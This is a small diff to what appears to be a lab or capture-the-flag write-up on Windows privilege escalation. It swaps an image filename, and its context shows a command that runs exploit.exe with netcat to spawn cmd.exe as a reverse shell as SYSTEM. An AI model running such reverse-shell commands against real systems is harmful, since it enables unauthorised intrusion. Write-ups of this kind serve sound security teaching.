@@ -166,6 +166,6 @@ C:\users\merlin\desktop\exploit.exe "C:\users\merlin\desktop\nc.exe -e cmd.exe 1
 
 This would give us a reverse shell as SYSTEM.
 
-<figure><img src="../../../.gitbook/assets/image (34) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
